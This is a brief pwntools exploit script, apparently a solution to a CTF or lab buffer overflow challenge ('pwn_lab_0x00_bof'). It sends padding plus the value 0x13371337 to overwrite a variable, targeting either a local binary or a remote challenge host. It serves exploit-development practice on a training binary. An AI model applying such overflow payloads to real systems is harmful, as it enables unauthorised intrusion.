# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')

debug_public_file = False
local = True
localhost = True
local_file = "./pwn_lab_0x00_bof_public" if debug_public_file else "./pwn_lab_0x00_bof"
host = "localhost" if localhost else "chall2.nisra.net"
port = 44001

target = process(local_file) if local else remote(host, port)

alter_var = 0x13371337
payload = b"a" * 4 + p32(alter_var)

target.sendline(payload)
target.interactive()
